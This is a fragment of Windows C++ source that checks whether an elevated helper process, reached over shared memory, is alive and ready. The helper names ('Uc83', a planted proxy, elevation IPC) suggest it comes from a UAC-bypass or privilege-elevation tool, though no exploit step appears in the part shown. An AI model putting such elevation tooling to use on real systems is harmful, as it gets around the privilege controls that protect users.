    if (gone) TryDeletePlantedProxy();
    return gone;
}

bool Uc83QuerySessionState(int* readyOut, DWORD* pidOut) {
    const K32Apis& k = GetK32Apis();
    if (readyOut) *readyOut = 0;
    if (pidOut) *pidOut = 0;

    ElevIpc& ipc = GetElevIpc();
    if (!ipc.shm) {
        if (!EnsureIpcCreated()) return true;
    }

    const DWORD pid = ipc.shm->helperPid;
    const bool alive = WorkerProcessAlive(pid);
    const bool ready = alive && ipc.hReady && k.ready &&
        (WaitForSingleObject(ipc.hReady, 0) == WAIT_OBJECT_0);

    if (readyOut) *readyOut = ready ? 1 : 0;
    if (pidOut) *pidOut = alive ? pid : 0;
    return true;
}
